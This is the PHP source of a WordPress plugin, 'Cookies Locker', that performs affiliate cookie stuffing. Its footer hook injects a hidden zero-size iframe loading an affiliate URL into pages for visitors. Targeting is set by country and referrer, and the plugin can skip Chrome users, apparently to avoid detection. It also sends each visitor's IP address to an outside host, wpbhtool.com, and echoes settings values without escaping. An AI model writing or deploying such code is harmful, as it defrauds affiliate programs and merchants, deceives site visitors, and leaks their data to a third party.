<?php
add_action('admin_menu', 'cl_create_menu');
add_action('wp_footer', 'cl_show_footer');

function cl_create_menu() {
	//make sub menu
	add_submenu_page('options-general.php', 'Page Cookies Locker', 'Cookies Locker', 'administrator', 'cookies_locker', 'cl_settings_pages');
	
	//call register settings function
	add_action('admin_init', 'cl_register_setting');
}

function cl_register_setting() {
	//register our settings
	register_setting( 'cl-settings-group', 'cl_enable' );
	register_setting( 'cl-settings-group', 'cl_referer' );
	register_setting( 'cl-settings-group', 'cl_country_option' );
	register_setting( 'cl-settings-group', 'cl_aff_url' );
	register_setting( 'cl-settings-group', 'cl_aff_cbc' );
	register_setting( 'cl-settings-group', 'cl_referer_other' );
	register_setting( 'cl-settings-group', 'cl_chrome' );
	register_setting( 'cl-settings-group', 'cl_cbc' );
}

function cl_settings_pages() {
	$geoip_file = plugin_dir_url( __FILE__ )."geoip.txt";
?>
<div class="wrap">
<div id="icon-options-general" class="icon32"><br /></div>
<h2>Cookies Locker</h2>

<form method="post" action="options.php">
	<?php settings_fields( 'cl-settings-group' ); ?>
	
	<div class="metabox-holder">
	<div class="postbox">
	<h3 class="hndle">Cookies Locker Setting</h3>

	<table class="form-table">
		<tr valign="top">
		<th scope="row"><b>Enable</b></th>		
		<td><input type="checkbox" name="cl_enable" value="1" <?php if (get_option('cl_enable') == 1) echo "checked" ; ?> />
		Check this if you want to enable this plugin
		</td>
		</tr>
		
		<tr valign="top">
		<th scope="row"><b>Default Affiliate URL</b></th>
		<td><input type="text" name="cl_aff_url" value="<?php echo get_option('cl_aff_url'); ?>" size="50" /></td>
		</tr>
		
		<tr valign="top">
		<th scope="row">
		<b>Cookies by Country</b><br /><br />
		<small>Input GeoIP &amp; affiliate url per country separated with comma<br />
		Format : <b><i>XX</i>,<i>http://affiliate.url</i></b><br />
		One per line<br /><br />
		Example : <br />
		US,http://www.amazon.com/gp/product/B00067L6TQ/?tag=AFF_ID-20<br />
		DE,http://www.amazon.de/gp/product/B004E0Z7E6/?tag=AFF_ID-21<br /><br />
		From the example above, visitors from all countries except US and DE will get Default Affiliate URL as cookie URL<br /><br />
		<a href="<?php echo $geoip_file; ?>" target="_blank">View GeoIP list</a>
		</small>
		</th>
		<td><input type="checkbox" name="cl_cbc" value="1" <?php if (get_option('cl_cbc') == 1) echo "checked" ; ?> /> 
		Enable <br /><br />
		<textarea dir="ltr" name="cl_aff_cbc" rows="10" cols="60"><?php echo get_option('cl_aff_cbc'); ?></textarea>
		</td>
		</tr>
		
		<tr valign="top">
		<th scope="row">
		<b>Filter by Country</b><br /><br />
		<small>Press &amp; hold "Ctrl" key to select multiple countries!<br />
			use the "Shift" key to batch select!<br /><br />
			If you select one or more countries, the filter will be turn ON, and vice versa.
		</small>
		</th>
		<td>
		<?php
		$coun = get_option('cl_country_option');
		$file = fopen($geoip_file, "r") or exit("Unable to open file!");
		?>
		<select name="cl_country_option[]" size="30" multiple style="overflow:scroll; height:300px;">
			<?php
			//Output a line of the file until the end is reached
			while(!feof($file))
			{
				$isi_txt = fgets($file) ; 
				$isi_txt = explode(',',$isi_txt);
				if (in_array($isi_txt[0] , $coun )) $sel = 'selected="selected"';
				echo "<option value=\"$isi_txt[0]\" $sel >".$isi_txt[1]."</option>";
				$sel = "";
			}
			?> 
		</select>
		<?php fclose($file); ?>
		</td>
		</tr>
		
		<tr valign="top">
		<th scope="row">
		<b>Filter by Referer</b><br /><br />
		<small>If you check one or more referers, the filter will be turn ON (include Custom Referer).</small>
		</th>		
		<td>
		<?php
		$check_ref = get_option('cl_referer') ;
		if ($check_ref == "" ) $check_ref = array();
		?>
		<input type="checkbox" name="cl_referer[]" value="google.com" <?php if (in_array("google.com",$check_ref) == 1) echo "checked" ; ?>  /> google.com<br />
		<input type="checkbox" name="cl_referer[]" value="google.co.uk" <?php if (in_array("google.co.uk",$check_ref) == 1) echo "checked" ; ?>  /> google.co.uk<br />
		<input type="checkbox" name="cl_referer[]" value="google.de" <?php if (in_array("google.de",$check_ref) == 1) echo "checked" ; ?>  /> google.de<br />
		<input type="checkbox" name="cl_referer[]" value="yahoo.com" <?php if (in_array("yahoo.com",$check_ref) == 1) echo "checked" ; ?>  /> yahoo.com<br />
		<input type="checkbox" name="cl_referer[]" value="bing.com" <?php if (in_array("bing.com",$check_ref) == 1) echo "checked" ; ?>  /> bing.com<br />
		<input type="checkbox" name="cl_referer[]" value="facebook.com" <?php if (in_array("facebook.com",$check_ref) == 1) echo "checked" ; ?>  /> facebook.com<br />
		<input type="checkbox" name="cl_referer[]" value="t.co" <?php if (in_array("t.co",$check_ref) == 1) echo "checked" ; ?>  /> t.co (Twitter)<br />
		<input type="checkbox" name="cl_referer[]" value="youtube.com" <?php if (in_array("youtube.com",$check_ref) == 1) echo "checked" ; ?>  /> youtube.com<br />
		</td>
		</tr>
		
		<tr valign="top">
		<th scope="row"><b>Custom Referer</b><br /><br />
		<small>
		Input your traffic source <br />
		( without http:// and www. ) <br />
		One domain per line <br /><br />
		Examples : <br />
		trafficholder.com <br />
		google.co.id <br />
		w.info.com <br />
		del.icio.us
		</small>
		</th>
		<td><input type="checkbox" name="cl_referer[]" value="other" <?php if (in_array("other",$check_ref) == 1) echo "checked" ; ?> /> 
		Enable <br /><br />
		<textarea dir="ltr" name="cl_referer_other" rows="10" cols="60"><?php echo get_option('cl_referer_other'); ?></textarea>
		</td>
		</tr>
		
		<tr valign="top">
		<th scope="row"><b>Block Chrome Browser</b></th>
		<td><input type="checkbox" name="cl_chrome" value="1" <?php if (get_option('cl_chrome') == 1) echo "checked" ; ?> />
		Don't drop cookie at Chrome Browser</td>
		</tr>
	</table>
	
	</div>
	</div>
	
	<p class="submit">
	<input type="submit" class="button-primary" value="<?php _e('Save All Changes') ?>" />
	</p>

</form>
</div>
<?php
}

function cl_show_footer() {
	$geoip = get_geoip();
	$coun = get_option('cl_country_option');
	
	if ( $coun != "" )
	{
		if (!in_array($geoip,$coun)) $err = 1 ;
	}

	$reper = get_option('cl_referer') ;

	if ($reper != "" )
	{
		$rg = get_ref();
		$found = 0;
		if (in_array("other",$reper)) 
		{
			$index_other = count($reper) - 1;
			unset($reper[$index_other]);
			$reper = array_values($reper);
			$other_domain = preg_split('/(\r?\n)+/', get_option('cl_referer_other'));
			$other_c = count($other_domain);
			for ($i = 0 ; $i < $other_c ; $i++)
			{
				$reper[] = $other_domain[$i];
			}
		}
		for ($i = 0 ; $i < count($reper) ; $i++)
		{
			if (stripos($rg, $reper[$i]) !== false) {
				$found = 1;
				break;
			}
		}
		if ($found == 0) $err = 2;
	}
	
	if (get_option('cl_aff_url') == "")
	{
		$err = 3;
	}
	
	if (get_option('cl_enable') == "")
	{
		$err = 4;
	}
	
	if (get_option('cl_chrome') == 1)
	{
		$ua = $_SERVER["HTTP_USER_AGENT"];
		if(stripos($ua,"chrome") == true) $err = 5;
	}
	
	if ($err == "" )
	{
		$link = get_option('cl_aff_url');
		if (get_option('cl_cbc') == 1 ) {
			$aff_cbc = preg_split('/(\r?\n)+/', get_option('cl_aff_cbc'));
			$cc_url = count($aff_cbc);
			for ($af = 0 ; $af < $cc_url ; $af++ ) {
				$aff_link = explode(",", $aff_cbc[$af]);
				if ($geoip == $aff_link[0]) {
					$link = $aff_link[1];
					break;
				}
			}
		}
		if (!empty($link)) echo "<iframe src='".$link."' width='0' height='0' frameborder='0' border='0' style='visibility: hidden; width: 0px; height: 0px; border: 0px;'></iframe>";
	}
}

function get_ref() {
	$ref = $_SERVER['HTTP_REFERER'];
	if (!empty($ref))
	{
		$domain = get_domain_name($ref);
		return $domain;
	}
	else return '';
}

function get_domain_name($url) {
	// get domain name from URL
	preg_match('/\/\/([^\/]*)?\//', $url, $matches);
	$domain = $matches[1];
	$domain = str_replace( "www.", "", $domain );
	return $domain;
}

function get_geoip() {
	$ip = $_SERVER['REMOTE_ADDR'];
	$postResult = file_get_contents( "http://wpbhtool.com/get-code.php?ip=".$ip );
	return $postResult;
}

?>